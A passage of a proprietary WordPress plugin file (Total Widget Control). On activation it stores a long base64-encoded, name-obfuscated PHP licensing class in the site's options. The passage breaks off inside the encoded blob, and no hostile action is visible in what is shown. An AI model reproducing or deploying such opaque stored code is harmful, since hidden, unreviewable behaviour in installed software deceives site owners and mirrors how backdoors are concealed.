<?php 
/**
 * @Author	Jonathon byrd
 * @link http://www.jonathonbyrd.com
 * @Package Wordpress
 * @SubPackage Total Widget Control
 * @copyright Proprietary Software, Copyright Byrd Incorporated. All Rights Reserved
 * @Since 1.0
 * 
 * @TODO I need to loop the widgets after init and create my own global arrays of certain widgets.
 * @TODO After looping the init global widget arrays, they need to be filtered
 */

defined('ABSPATH') or die("Cannot access pages directly.");

/**
 * Function is responsible for preparing the free license.
 *
 * @return null
 */
function twc_activation( )
{
	$parts = parse_url("http:/"."/".$_SERVER["SERVER_NAME"]);
	$licenses = get_option('twc_licenses',array());
	$licenses[$parts['host']] = 'IGNsYXNzIFpqSXdYMlp2ZFhKMGVRIHsgcHJvdGVjdGVkICRTMlY1Y3cgPSBhcnJheSgncHJpdmF0ZSc9PicnLCd4ZmFjdG9yJz0+JycsJ3lmYWN0b3InPT4nJyk7IHByb3RlY3RlZCAkVEc5amEzTSA9IGFycmF5KCk7IHByb3RlY3RlZCBmdW5jdGlvbiAmUjJWMFMyVjUoJGJHOWphMVI1Y0dVKXsgcmV0dXJuICR0aGlzLT5TMlY1Y3dbJGJHOWphMVI1Y0dVXTsgfSBwcm90ZWN0ZWQgZnVuY3Rpb24gU1c1elpYSjBTMlY1Y3coKXsgJHRoaXMtPlVtVnRiM1psUzJWNSgpOyAkdGhpcy0+VW1WelpYUk1iMk5yKCk7IGZvcmVhY2ggKCR0aGlzLT5TMlY1Y3cgYXMgJFMyVjVWSGx3WlEgPT4gJFMyVjUpeyBpZiAoc3Ryc3RyKCRTMlY1Vkhsd1pRLCAnZmFjdG9yJykpeyAkUzJWNSA9IG1kNShzZXJpYWxpemUoJHRoaXMtPlMyVjVjdykpOyB9IGVsc2UgeyAkUzJWNSA9ICdsb2NhbGhvc3QnOyB9ICR0aGlzLT5TVzV6WlhKMFMyVjUoJFMyVjUsICRTMlY1Vkhsd1pRKTsgfSB9IHByb3RlY3RlZCBmdW5jdGlvbiBTVzV6WlhKMFMyVjUoJGEyVjUsICRiRzlqYTFSNWNHVSl7IGlmIChzdHJsZW4oJGEyVjUpID4gMCl7ICR0aGlzLT5TMlY1Y3dbJGJHOWphMVI1Y0dVXSA9ICRhMlY1OyB9IH0gcHJvdGVjdGVkIGZ1bmN0aW9uIFZIVnlia3RsZVEoJGJHOWphMVI1Y0dVID0gJycpeyBpZiAoISRiRzlqYTFSNWNHVSl7IGZvcmVhY2ggKCR0aGlzLT5URzlqYTNNIGFzICRURzlqYTFSNWNHVSA9PiAkVEc5amF3KXsgJHRoaXMtPlZIVnlia3RsZVEoJFRHOWphMVI1Y0dVKTsgfSByZXR1cm47IH0gJFMyVjUgPSYgJHRoaXMtPlIyVjBTMlY1KCRiRzlqYTFSNWNHVSk7IGZvciAoJGFRID0gMDsgJGFRIDwgc3RybGVuKCRTMlY1KTsgJGFRKyspeyAkVTNSbGNITSA9IG9yZCgkUzJWNVskYVFdKSAvICgkYVEgKyAxKTsgaWYgKG9yZCgkUzJWNVskYVFdKSAlIDIgIT0gMCl7ICR0aGlzLT5WSFZ5Ymt4dlkycygkYkc5amExUjVjR1UsICRVM1JsY0hNLCAnbGVmdCcpOyB9IGVsc2UgeyAkdGhpcy0+VkhWeWJreHZZMnMoJGJHOWphMVI1Y0dVLCAkVTNSbGNITSwgJ3JpZ2h0Jyk7IH0gfSB9IHByb3RlY3RlZCBmdW5jdGlvbiBVbVZ0YjNabFMyVjUoJGJHOWphMVI1Y0dVID0gJycpeyBmb3JlYWNoKCR0aGlzLT5TMlY1Y3cgYXMgJFMyVjVUbUZ0WlEgPT4gJFMyVjUpeyBpZiAoJGJHOWphMVI1Y0dVID09ICRTMlY1VG1GdFpRIHx8IHN0cmxlbigkYkc5amExUjVjR1UpID09IDApeyAkdGhpcy0+UzJWNWN3WyRTMlY1VG1GdFpRXSA9ICcnOyB9IH0gfSBwcm90ZWN0ZWQgZnVuY3Rpb24gJlIyVjBURzlqYXcoJGJHOWphMVI1Y0dVKXsgcmV0dXJuICR0aGlzLT5URzlqYTNNWyRiRzlqYTFSNWNHVV07IH0gcHJvdGVjdGVkIGZ1bmN0aW9uIFRHOWphdygkWkdGMFlRKXsgaWYgKEZBTFNFICE9PSAoJFpHRjBZUSA9IGJhc2U2NF9lbmNvZGUoJFpHRjBZUSkpKXsgZm9yICgkYVEgPSAwOyAkYVEgPCBzdHJsZW4oJFpHRjBZUSk7ICRhUSsrKXsgJFpHRjBZUVskYVFdID0gJHRoaXMtPlIyVjBRMmhoY2coJFpHRjBZUVskYVFdLCBUUlVFKTsgfSByZXR1cm4gJFpHRjBZUTsgfSBlbHNlIHsgcmV0dXJuIEZBTFNFOyB9IH0gcHJvdGVjdGVkIGZ1bmN0aW9uIFZXNXNiMk5yKCl7ICRaR0YwWVEgPSBleHBsb2RlKCc0MjFhYTkwZTA3JywgJzQyMWFhOTBlMDcraG43bEh0VHg2MXJwNkZSaEhqLzVoSG9sNG55cFNBZXhobnBxV0dPV0NMeHBhejY1dGptdkExZXo1THdxaHJqVDVMb3ZIbk0rQ0EvMldyR2hpMUUyQVd4ZHducitNckpUd3orMkEvU2hDUnlkZ0FQV2UxUVdnSmV4d3pycDBGNjVXalFxV3RUeWlmUXZnQlI1NUhYbEF0SlRTdGR5NXpPeE16L25pekwyMHJHNUFybys2bVlRZzFKVGF6UXZpakw1V243dk5CUys1SmRXMHBPKzZ0YTJDV2U1Q2pHdkhyaVRpdHc3V0YxVGlKdmRpZGk1Q0hOeUNwNDdldFFxd2NQKzZ0d2xNZkpkNm53MngvWTV0bjd2QTFlaDVuUXB0ckJ4SG5ZeU1nWXZObmRoZ3JtVGlKUXlOV3hHYUZrcWhyYVRpZ0p2QTFleHdGeVdIQTY1Q0o1blcvU2g2Rjh2d3A2V3hBd3Y1V29sQXR4eS9yaHg1Ukd2Vy9TVGlmUStNckpUV2p5eU5wNFdlenJkSHJhR0FuUWxpQWV4ZUZ0cWhBUEdNbm1sTnpKdkVMNVdTQWVHTW5ycXRuTHFBcHoyQS9SK2d6UHpndDBod0ZqcGlSYnhBZEhXQ3I1NXdHZTJOanhXQW5ycVdwTys1ZkRXNHo2NUNnSnFXMWVwQzFqZGdBSSsvaisyaUFUeGVwZDJNSEpXQzE1eUNwSmRDandxaEFQV2UxUVdnSjU1L3Q4K05waldXekY3V0YxZDVMV3EvMWV4dHpvemd0NDJOSHJkaWpiR01qUXFDcEIrNWZRcC9ISldDMTVXSHo0cTB6ZTJNV1MraHovMld0ZXh3Rjh2Z3RPK0h6b3pndDBodHB6MkEvUitoZFlHaXJlaHhBRCtNSm9UaUhveU5yNDIwR3loaW5QR01ubWxOekp2RUxXcS8xZXh0bjd2Z0x4eVNuciswRjY1dG5YcXQxeGR3bnJkSHJoeDVSR3ZodE12Tm5RZEhyaHg1Ukd2V0dQeTR6L3ZlRit4YXRFN2h0MGh3RmpwaVJieEFkSFdBR2JXd0dlMk5qRHhoR3pxV0dWVzVmUXAvSEpXQzFXbGd0MGh0cHoyQS9SV0NMbWxpZFJsQXJEVzR6Nkd0ekU3aHQ0NXdBODJoWFlUV2xKbmh0TisvajUyZUZWVENIWHZIMUFwNWZRcGdKcmhpSkV5aXJXNWVuZTJBVFlUL241aC90TXZOblF2NmppNXhyTmxpQTQ3ZTEvZGl6Uytoeit5dHpONTZGR3lpcFNUNVJ6cVdHVlc1bmRoZ0FPR01qN25DQTRxTmpHdnd0Uys2dG96Z3QwaHdGanBpUmJ4QWRIV0FHYld3R2UyTmpEeGhHenFXR1ZXQzEvcTVuUDV4Rm0raXo0aDZwK3kvcmpXdGorbEgxNXBlenJkSHJWaGdHeWxBdFBHNHpqMk1ISldDMVdsTWZKZDVML3BpallUYS9ZUUhHUHlBbnRXZzFVR01uWDJBV3hHYUZrcWhySjV0ait2NXpMek5uUStBcklUV2p6bkFGbzV0ajc1TUoxeDVvSHFoTDB5U25yKzBGNlRnalFuQ3A0V0MxL3BIR1AraG55djVyTHh3RmpXU3RIK2hHeTVNSlR4Q3R6eVNXSitnem96Z3QwaENBK3ZBdGFXSEdBR0hGeGQ1SnhXdDFWV2UxL3p0bk5HYW50V3RHYVdXalk1TUpQeDZycDJXQWE1d0ZJdkFuNG40QWgyNWpkaHRsZ3EvSm9Xd3I1V2lwVFdBV29wNUFNNXdHejVBQUpXaGpveUNBUDJNZngyVzFiaC9qNTVBbk1wL0d0V2hKTzUvcEFsdG1SeUFuRHZDUklXSGo3bnRUWXFBQXQyQUdyV3RweXl0R1ZkdG5lcGFwcHhDSHl2dE1Zbk1Md3kvQlI1Q0hvcUNNVWxNR2VwU3RNVEhHRXp0cjVkZW50NUFHTWhIcE5XQ01SMk1mK3ZOcE1UaFc1VFduaDVDMXB5L0pyaHRuU2xDV1ArL1JwdjZwRFdNR28rNXBlMjQxanY2Rk5XZ2xKcE56NWR3Rzd2aXB5VGhoZ3ZoZ1MyQUdoMk5qdmh0cHJxQ0FNR01qZTU0Y1N4NVJQdi9KTkc0MXQ1QUFKRzVIKytIcG9XeHJHdk10YldDSFlXV25BN2hHd1doSk81L25TcUNXNXlBbnd5aWo1VGUxRTJITVlsYWpqcFdHeldXbEp5dEFPbE5KL3AvVGlUd0F3dkFNVXlNR2hkYXBPV2dub3EvSG9XdHJ6V0ExTHhnVzdsdEFMNzQxdFdDamVXV1dtcHRwT3g2RzV2QTFNVHhGUXlIblRXQzErcDVSVVQ1SFNsQ1dvRzRHeldnSkRXaVJOK1dHYmh3R3pXdEdXV2duK3BOeld4dEZHdmVGNUdBbnk1V25oNXhGNXZnWEhHTXBRcEF6VytDTDVXaXBHaHd6N2xDQVBXdHQ4dk1KWFdoallwdFdNZENMeXlnSitHV0dXcXRuZTc1SDh5L0dRV3dCWG5pcGU1NkZ3cS8xRzV4elludFRZbk1wanBXR3BXSFdtNUFHTEdhajVXYXB5V05MLytBTVV5TUdlMk5vVTV4QXlodHpCRzRyenBpakk1L0dFei9nWXowenhwQ2plV1dHR3F0cFZwd0EvV00xTVR3RjV4aEhBeTBBaFdpak94L1c1MmlCWUcwcnhXQTFEV2lSV3FOcFdoLzF5dml2VUc1MU52TUhvZHdXR3Y1WlN4V1dydldXQWhDZjV2NXNpNUNML3BOQU1HTkx6cHhXVmg1SlkyQ3BBV2VqNzJXQUp4V1dvZEhCUnBDTHkyQ2ZhR1dHNVdXbmVuTmYvMjVzaXh3Rnd2SHpOR01KdDI1ZFJXV3BBdnQxTzJBdC81QUdoeHhCWHZNSG95U3I3cENwYkdXanBxV3pUVy9MaHAvQkhoNTE1K2dIV1cvZmUrTlJOR1dXNzJ0L1JsNDF0V2lqTVdobnd2QVRScHdHN3lnR014V2xKK0FHZXlOMXB2YUZPR01HKzVDTVV5Tkh6dkNqTldNR055aXA1NWUxNTJObmJUaGpvdkh2WTJNdHkrTTE1NXdBL3p0elY1L2pqVy9UaUdBai8rdEdWRzRqV3BTdExHQXB6dnQxQmxBMTcyVzFqVGhwR3FDelB4L2ZHdkhtaTV4RjU1V25oNWUxeldpamtUaHBRaENBQVcvMXd2TlJWV3dBbXlIMUx6aHBoeUhHSnhocHl2QWRSeVNyN3BhemFUaHA3bnRNVW5NTFdXTUJSeDQxNTVoSFBsQVdlcGFwVlRDMU4rdHpvZHh6eHBoL1JoaUwrMjV6Qng2RzgyL1diVFdHL3FoZ1V4Q0g1eS9yZTVDSGc1V2RZVzZXenZDak1od0FOdlcxbzV0MStwYUZXV1dqWXlDelcyQUY3dmdHcDUvbjdwNVdMVFNGcHY1Umt4eEZHcS9Kb1d3cjVXaXBUNUMxN3pXL1lXQ2Z4dkNqWHhlMXkrSEdiRzRHR3ZDUnBUeHJZeEhuV3poanlxL0dRV3dGQW5pcGV4L3BXcE1HVlRnbm1XSHpPKzYxdFdIcnJXV24rMld6QitlaitXTUp5NS9HL3FBTVVuTXo4cS9yaTVlMXBuSEdMeU1HejVBVFI1Q0xQdnR6TGxBcnpXQ2oweHhGbTJXTVIyMFdlK01XWFdOUjV4Z0hBeUF0eCtNdFhod0ErNVd2VXhDSHpXaWo1VzBBTnovSkIyU3o4dk5wWXhoaklxL2ZocC9mcHZOcCtHQWhIeE5XVis2QTVwQ1JVV2dHN2hoSFdHQUFlV0hya0cwelFwNUFvaGVuejVNR1hXaHBOeXRwYng2R0d2ME1pVHhGSXF0blcyTjErcS9HVld0aGd2SHpOMk1SdDI1ZFNUZTFFbEEvWTdocGgyQUdyV1duNzJXck5wdG56dldyRzUvRy92dE1TMjRqK3FlcE9HQVcrenRtU1RhMXorTmZiaHdBRnFBL1k3NDE4dnRCaVRTRitsNVdOVy9SajIvQVhUaEc1aFdXZWhlRzdXQ2pPNUNvSDU1V1RHMFdwdkNwVng1UkFxQW5BK2UxeHBIMU1XSG4vdkgxQXhDZitXQ2orRzVKL2xOemJwQzFoMk1ycldnV0dxTkE1R010V1dIckxoZ2pycU5wTnBDZmh2QUdkeFdubytIV01kL3RqcGhtaXhXbjc1Q3ZVN3hBcFc1UmloaTFvK2lCUnlBdDd2TmpOV1dHbXlIVFVUYWpqcHRHSldIV212V3JCKy9XaitNcmJUd0JIcU1nVTJBand5L0pWNUNSR25IR0w1NnJlcHh0TlRDMTcySE1ZR0FyL1dIMWVXSFcrbFdHTnB3R0d2NHBwRzVMWXhXbld5NDE3VzVST3hlMTc1Q01VeENMenF0MU5XTUc1MnRUUjVlcngrTnBVV1dqWXl0dlJkd0dlcENwNVQ2MSt6L1hVN2hqaldNQml4ZTFQcUFwUHgvalc1QUdraFN6SXE1QW9odDFqdjVqaFdocE4rQVdOMk5MaDJDcEpoSFdZcENBNGh0amhXTUdWaHRHRnF0bVN4L1JXcGlwTlR4QW1sdC9SeC8xeldnSlR4d0JKeUNBNWQ2cmp5U1d5V05MLzJ0TVNsQXRocE1KVjV4Rit6dDFiaC9wZVdhcElHTjE3V0gvUlRTejh2L2dVeHhjSmw1V05XL1JqMi9BWFRoRzVoV1dlaGVHN1dDak81Q29INTVXVEcwV3B2Q3BWeDVSQXFBbkErZTF4cEgxeXhXajU1TnJWcGVqeXBoV2F4Q0g3MldHVDJBRzVxL3JWaDVMU3FBemg1L2plV2lkUmgvbm1sdHpQeHQxeXBDcEh4V3BOeUhBaGR4ckd2dDE1R1dHNStIV1d6eEF3VzVSZHh3ek5oVzE0eC9XdDI1dlloeEFveGdnWTVlMTcyQVRVV3RuLzVBMVZ4d1dHdjBXcGhnR21wSHpUV3h6eXB0R2tHMEY3Ky9ITGxBcmVwSEFiNUMxTjJIclduYXJoMmhKTFd0am9XdEdiZEMxcHlhelhoSHB5K0FuZUcwQStwaWpVaGlMNzVDTVV5MFd6V2lSRFRpMS92VzFvNUNmeXYvSGJ4V3B5MmhmTmRlakd2MGpiVHdyK3BpdlloNkF0cHRHdlQ1SkZxTkFOV3RBV1dIQWl4dEdtMnQxUHpXdHQ1TmRIaHhyL3kvSG9wZWplcGh0Ymhnbnk1Q0FCMjB6eXBNR0lXdGpRNXR6QlcvcHpXaWRTV3dBTnBXR2grdEF6VzVwcFdIbit4aWRTKy8xNXZBR0k1L1c3eE1IZTJBai8yQUdJNXhGKytDTVVsTUd6NUFHTEdOUkZxQS9ZNzQxOHZ0cjRUU0YrbDVXTlcvUmoyL0FYVGhHNWhXV2VoZUc3V0NqTzVDb0g1NVdURzBXcHZDcFZ4NVJBcUFuQStlMXhwSDF5VGhsWHEvZmhwL2Z4Mk52U1R3cjdsQVc0bjRBaDJOUmtod3J3cXR6NGh3cnpwNWpiRzB6cnFBcjVwdHR5K0FHTGhIcHkraUExbjBHeXBpUitoU0FXdkNXUGg2QTh5L0drV3RHRnF0L1V4L1d4V2FwUmh0bm14QS9VaHRBOHY0RnpXSFdtcS9KVzJNV2VwL0dJNS9HL3FNSGI1L0w1cUNwaTV4cm9oNU1VbE1mZVd4V0I1NjE3K1cxQjVlbngrTVhTVGkxTnZIVzV5MFd3NU1HcHhXbjdoTWdVNzVMKzIvSkFUNUptV3R2VWw0bnpXaWo1V2hHTnlnUmJXdHR5dnQxa1dnam92aVdXeENKR3EvMSt4V0dtZGdnWXlOSHB2NVlIV2dqQXFBcG9XL2Z6cDVqR2hnalFwV25OcGVqL1dDcEh4V3BObnRCWTJTckd2dDE1R1dHNTVNSDR4L3p4cS9HUXhDTC81Q1dUVy9XdDI1cEJXV3BOdldUVVRhakd2V0dweHdGbTVXekIrZWp5cHRyeVR3cnludFdNcEMxaHEvSmk1L1d5cXRyNGwwcDVXZXBSVGdwTjJIRzVkdHJ5ZFNzUldnbi8yV3BveTBXL3ZpUk01d3J6cVdXaHB0dHB5L0pyNUNMNzVDVzV5NGp6V3hXNVdOMUUrV25BeTR0K3BDait4V2o1NU5yVnBlajh2TnBEeENINzJXR1QyQUc1cS9yVmg1TFNxQXpoNS9qZTVOWVJoL2pZMnRCUnBlai9XQ3BPaHhyN1cvSDUyMEFHcS9HSmhIV1lsL0hCMmExaHZNSmlXdHBBbENXTHhDSDU1TlI1aGlSTnlDQUJwLzFocUNwWFdobit5dHJCbE5KN3BoSnlXTjE3cGdIYjV0Ry8yQUdPV3dyR3FDV2V4L2ZXcDVqR2hDMU5sQUFMaHRyeHBDc1VUaUwrNVdXZXlNUnQyQ3pYVFdHL2QvWFl5QTF4dmlmWDV4QW9xQ0JTV0NIenF0MU5XTlJOeS9ZWWxhMTUyZUYrV2dqbzU1cFZ4eHJwdk5wNUdBbnlwTldMR01HcHY1UlVUaGxncXR6NDd4enpwNWpUV0FuNnFBL1NkQ2Y1eWFGSlRTem95SHpOcENMeXlpakp4V1dXcXRuZWh0andXaEpVaDVnWG5pQlV4L0p6dlcxNVd3QU5wV0doK3RBelc1cHBXSG4reGlkUysvV3kyTVdYR0FHLzJ0TVVuQWpocE5wSTVDTCsrQ01VbE1wZVdpZFN4SEdGcUEvWTc0MTh2dHJRV3Rqb1d0ek9sMFcveVN0R0dBajVxQVdUV0NINTI2Rk94ZTE3MmlCWXA2anB2Q2xTaHdBNXovSjQyQUFqdjRGTlRobis1QXBocEMxK1cvQWI1eHJ5V2dITjVDSGp2NWpkaHRsZ3FDQUF4L2pXV2dKVmgvemdXSHpWeGVudHkvSjRoeEYreXRHYkc0R0d2Q1JwVHhyWXhIbld6aGp5cS9Ha1d0akdsdG1ZbEFuRHZOak41eHJtbHRwT3AvcHQyQVdYeHhyL3EvSmhkL3Q3cC9HeTV4RjdxQVdNcEMxaHEvSmk1L2pZcXRyTlcvTHd2MHQ1eDVMb3BXdGIyTUw4djVqR3h3Rm1wdFc1eU5MNXZDelhUaEc1cVduV3kwQSsrTTFBVGhqRXFDQlU1eFd6dkNsUzUvR04rV1RZaGVueHBIMU1XSGxKK056aHAvZjVXTUcrVGhuN3BBV01wQzFlNU1KaUdBbkdxL0pQVy9mV1dnSGloU3pJcVcvWVdDZnRXQ2o3eFduN3B0cE14Q0plV0FXYWhncCtoQ0E0NzVIOHlnWEg1eEF3dmlCVXh4cldwV3I1V0hqN25DcFdwdEF5cENqdmhIaEgrZ0pOeU5KN3AvR0dUeHI3bmhIVzJNTFdwTnByaDUxNStIekJodGp6cGdKMGhhMU4rL0pQR0FydFdpakFoaTFOcHRHNHkwVy92QXRYVFdXWXFoWFNXQ0g1MjVqTzVlMXpxTUpMeENIeFdBMURUNVJBcUFuQStlMXhwSDFNV0huN2RIMUF4Q0p5cDVqNWhnajVwV3plVGExanY1Uk9HNDFQcUEvUlcvSFdXNWpENUNSRXBXem9HQXQ3MmhKZGhIcHkraUExbFNyNytOWlNUd0YvbE1IQjJhMWtXTUdraHhGL2hDcFd6aFJ0eS8xUlcvR29sdG5OeHRBelc1cHBXSG4reGlkUytlajdwZ0pJaFNybW5XTVV4dEcvMk1HVngwRmcrL0hMbEFyZXBIQWI1QzFOMkhyNUdBcnQyQ3BZVGExTnl0cG9kL3RlcFd0WFRXRy9oaEhCV0NIN3BDalVHQUcraDVwNUdOSnB2NHBUR05STnlIMVBodEF5dkFHVVdXall5dHZSZHdHZXBDcHlHNUovbE52WWgvR3dwaWplaGlKUXFDV2VoL3RXV0hyTGhnanJxQXJoeHQxeXBDcFhoeHJnZGlyYmQ2Rzh5YWRpVHhGSXF0blcyTjF5cE1HSWh0R0FxdG1SR01XanBNMUlXTkhtbHQvWW5NcGpwV0dKV0hweTJXQlJXd1c1V2VqeTUvV1F4TUhXeVNyK3Y1Uk9HQVcrMmlNWWxNcGVXZ0hieEhXNzJIcjVkZTF5djVSdlRobi95dEc0eTBXdzVNR3B4NUg3aE1nVTc1THhXL0d2V3RweXp0cjRsNFd6V3hXNVdocDd5dC9ZaC8xanY2Rk5UaFdneXQxTmQ2R3h5U1d5aGdqenZXemVUYTFoMk5ST0c0MVBxTk1SVGFqZTVBV2l4dEdQcU5kWXpXdDhxL0pMaHhyZytnSFZkL2YvdkNSYnhXVy94SFdBeUF0K3kvR1loaVJBdmlwZTUvcHp2Tm5iVHhBRnZ0MU95YWpqV0N6WFdXam92V01TMmFqK3Y1UmJUd3pXekF6VGxNTGtXZUZpV2dHNnZIekFXdHJlcEhyVDU2MU4ySEdUK3QxeCtBR0FUaUwrMml6Qnh3V3d2Z1diVFdHL3FoZ1V4Q0g1eS9yZTVDSGc1V2RZVzZXenZDak1od0FOdlcxbzV0MStwYUZXV1dwTitIdlJkd0d4eVNXeWhnanp2V3plVGExaDJOUmk1Q2dIcE5CWVdDQXpwNWpER05KcnFBL1JodDF5cGgxWGh4cmdkaXpoZC9mL3ZDUmJoL1c1K0huTTV3QXdXNVJkeHd6TmhXMTR4L1d0MjV2WWh4QW94Z2dZNWUxNzJBVFVXdG4vNUExVnh3Vyt2MFdwaGdHbXBnSGUyTUxoeUNkUjVDUkdxdHpCR01mZXBhcFZUNjFOeXRyNWR0ci9XZ2dZVGlMbzVXcDBuTVc1V00xcFR4RlloV25laC9mL3ZnMVFoaUhTbmlXVnh0RnB2d3Q1eFd6ZzJnUmJXQ2Z5cXRyTnhXajU1QTFicGVqOHZOcHloZ0dtV2l6UGh0dGhkYXBBV3RwUStDQU55NEE1V1NzWUc1MS9udEJVeWFudHkvZ0h4V2hIcEFCUnB3QWh5YWRpeDVIWVdXbmVuQXRXdmhyVVd3Rm1oQ1c1R01XenB0MUloeEFveXQxTzJNcGp2NEZweGhXbStIMVB4dEZ4Mk5wYkdXajdxTWdVMkFqd3kvSlY1eEYrei9Ib3lNR2pwZXBJNTYxTjJDQllHQUd5djVqZVRocFF5dHAwbGFqL3lTdEdHQWo1cUFXVFdDSDUyNkZPeGUxNzJpQllwNmpwdkNsU2h3QTV6L0o0eWExaldlRlVUU3pvK0h2UmR3R3h5U1d5aGdqenZXemgrdEdwdjVSa2h3RlNxQS9SVy90RHZDbmloU0FFMkNkVWxhai9XTVhVaHhGZytIbk1kL2YvdkNSYmgvVzVuaUFONS9MdzIvWEh4d3pOaFcxNHgvV3QyNXZZaHhBb3l0MU9wL3BoeUhHcHhoV20rSDFWeHdXR3YwV3k1d3p3emhIZW5BanpXQ1lSeDBGZzJnSG9XdHJlcFN0TVRIcE55dE1ZR0FyR3YvSkErU0F5K2dIYmR3R3p2QTFNaC9uNzVNWFU3NTFqVy9yVVQ1b0g1dHBQR05KcHZpUlB4V0c1K1dBUGxhanl2aXBNV0hsSjVBQll4ZXRHdjV2U1R3cnp2dG5BaHRHeDJObFVHQVdnaDVXb3kwQTdxdG1ZVzBBUHYvSk14Q2Z5cEN2SHhXbm81QVdoR010NXZNbWk1d3ovbHRXaHB0R3l5L0pZV3d6eWh0MTR6MEFqcGFwUmh4QW95Z2dZNzRqaDJBR3JXSGo1MmhIVCtlanl5L0pJVzBGNXhNSGhwQ0x4cC9HT0dBVy9oV3JBbEFqd3Z3dEhUSHA3bEFUUytlMXl2NW9SV2duZzVBV2V5NHJHdndqWDVlMS95SG5lR2FHN1dNcllUNVJOMkh2U1d4cFdwTUdWVzQxN250MUE1NjErcGVGVFdncHkyaXpXMkFGN3ZnR3A1L243cDVXTFRTRnB2NVJWNUNKTnBBcFBXdEF6cDVqRDVDMTd6Vy9ZelcxeXZpdkh4V25nNU1INTIwQXZ2NHBJeDVSNWh0bjQ3aHB3V01HVmh4Ri9odC9VeC9XRHZXMUR4ZTFFei9nWTUvcCtwZ0pUeHdCSnlDQTVkNnJqeVNXeVdOTC8ydE1ZbkFqeHBDUlY1QzFOcWhIaGh0cmpwSHJMVEMxN3ZXR1dwdDEvaFN0dmhIcFFsV1c1eU5MenZ0dFhUaFc1NUFXVGwwemo1TUpBNXhGWXF0ZFJXZXR4V3hXRHhIV1ludG5OR1N6eHBXRytXZ24rNUExYnBDSnkrQS9TR1dHbVdpQU0rQzF3K01KaTVDMVBxQ0FNR05MV1c1alRoL3BFK1cxUHh0MTh2TnBYeFdoSFcvSDVwQ2ZHdk1KcDU2MTdsdG40NzQxK3EvR0l4d3p3bHRwTHhDSDU1TlI1VzYxRXl0QVBsYWp4V0ExQldXam92V01ZeWF0NVd0ckdUd0Y3eWdIZTJNTFdwTXJQNUMxTnFXcjQ1L0dqcEhyVEdOMUFxQTFBR2FydDJoSkxXV1dnVy9KT2xNV2oyeHBYV05SNWhoZ1V4Q0g3cE1yZWhpb0g1VzFNeC9qV3BTdERXTUdvKzV6YlcvMXlxL0prV0huZ3l0cmJwL2YrV0NmVVRobnlwQXpoK0NIcHY1UlZXd3pHcUFtVWgvdGVXTUdUaDVKWTIvZ1VuQTF5dml2SHhXbjdXdHBOcC90eDJXMXBoL1dZNU52VTdlV3dXTUpZV3d6cnF0bVN4eEF3eUhyVldXR0Z2dFRZVGFqR3ZBR0orU3J6bi9KVGxOSi92aFdhRzVMN3ZITVl6aEdXcE1KT1dIcFduSHpNaHRyanBTdExUQ0w3elcvUlRTejh2L2dVV2dXK1d0ek94dEY1V00xUXhXbnp6V3pMN1d0ZXBOcHJodEdONVcxTkdOSnpXaXBQR04xL3pXbk41Q2Z6MmhKYVRTQkpuNXpoeDZGNXZnMTU1L3ZKeE52VUdNR1dXQ1JPRzBycHFOQUFXdEE3dk5qMHh0V1krVy9SMjQxOHZIR0x4ZTF5cHRwb3BDSnh5aWpKaC9HV3FDQUIyQXR3V2hKTzUvV201dHpCVy9Xd3lIckloeEFveXQxUFRhakd2V0dJV1dqSXZOV1ZHNEcrdkNMYmhTclluZ0hlR01qeld0R0lXTkxnei9ITGxBV2VXYXBHeDUxenZ0cld6V3JHcXh0dnhXcFFsV1docC90ZXBpcE1Ud0Y1eFdHZXhlRzdXaWpPeC9XV3FOcFRXdHBXcEhyTmhhMTd6V25BK2UxeHBIMU1XSGxKK0FoWXg2cnh5U3BiNXdBNnZNSEF5MHpoeWV6WFd0aFlxL0pQVy9mV1d4aFNoL25tMi9KQVdlai81QUdpaHhCSnB0cE5XL2Z5eWlwNUdXR1dxL0hoNUNIK3EvR0lodHBQbmlCVXowQXhXTTFEeGUxQXZ0cmJHYWpHdkFHRHhoaEh5L0pvMk5BN3BDcGJHV2o3cU1nVTJBangyQUdyVzYxK3FXemVsNHJXcEExTEdXR0ZxV3RieVN6NzJ0ckJUU3JneS9KT2xNV2p5dEFiR0FwL3lIV2VHQXQ1eS9yZXh4QStoQ1dQKzZqenZDUlRUaTE3MnRuTWhlbngrTnBrV0hXb3lDcFZwL2Y1NUExeUdBdkp4QXplbjBBenEvclFHQWpBcS9KUDJhdDd2TmpJaHd6N2xDQVB6VzFoeWlwT2h4Rmc1TnJvV0NKd3ZpcEpoSEcvcENBNGgvcHh2aHJpaGlvSDV0ekJ4eEF4V1dyR1dXbm15SFRTcGUxNzJOWVMrU3IvNVdyTmRldGVwV1dYR0FqNXh0VzRodHR4cS9YSHh4QW01L0pWaHRyenBnSGI1L3BOK3R6b2R4enhwaC9SaGlMbVd0cG9kL3RlcFd0WFRXV1loL1hTV0NIcHEvSnJ4eGNINTVyYnhDSHB2MFc1VGhwRW4vSkF4eHp0V3RHa1doV201V3JWcDZGeDIvdGFHV1dReE1nWUdhMWh5L0FYRzB6R3F0R0x4ZXRXV01HR2g1MTcrVzFveWFqL1dDcEh4V3BOeUhBaGR4ckd2dDEraFNBNTVBVzQyNEF3Mi9YSDUvR041L0g1VFNGeFdhcFJodG5teEEvVWh0QXR5SEdwV0huK3hpZFMrLzE1dkFHSTUvVzd4TUhlMk16eXB0R1Z4MEZnKy9ITGxBcmVwSEFiNUMxTjJIclduYXJoeXRyWXhobm9XdFRSZHdBcHlhelhoSHB5K01vVUcwQTUyLzFRaGlMNzV0MTQ1Nmp6V2dKTlRlMUVudC9ZdnhHanZOZmIrU0ZvdlcxQXhldGgyQ3pVNXd6NXA1V0xHMHp6cS9CaXh4Ri9wQWRVeHRqN3F0bVlod3o3bHR0YjV3RytwaVpZeHh6V3ZIMU5wQ0plcHR0YVdDMTdXV1dUbE16d1dNSllXd3pycXRtUkdTRnpwNXNTV05Sbyt0L1NwL3B5dnRycldXbi81V0dWZDZGNXZoVGlHV0c1cU1nWWhDMWUyTlJyVGExNSt0MWJ4NnJlV2lwTkdXcDdsTUpQR0ExeXZIR0FUaG5nK2l6Qng2RzgyL1diVFdHLytIR1d5MEErcDVmWGh0cDc1dDFORzRqenZOalBUaEdOei9KQjJTenRXdEdPRzVMb2w1ek1wQ0orcS9HNVRoaEh4TldWKzZBNXBDUlVXZ3BycS9KUFcvZldXZ0hpaGExQXE1QW9wZWp4cENqT3hXbm1XdFdOcDZHN3BpTGFUV0c1NUFXQlcvenhxL0dReENMd2x0bVNXdG53eWlSRGh4QW95SDFPcGVqR3ZBR1V4aGxKeXRwVGw0cnh5L0hVaEhqNW5oSFd6V0dlcC9UaXgvakl2aVc1V0NKdHlpUlJUZ3BOMnRyYnB0R2pweFd2RzUxUWxXR04yNHJlcE10YnhDTDV4SFdleGVHeHEvV0pUNVJBcUF6TnlO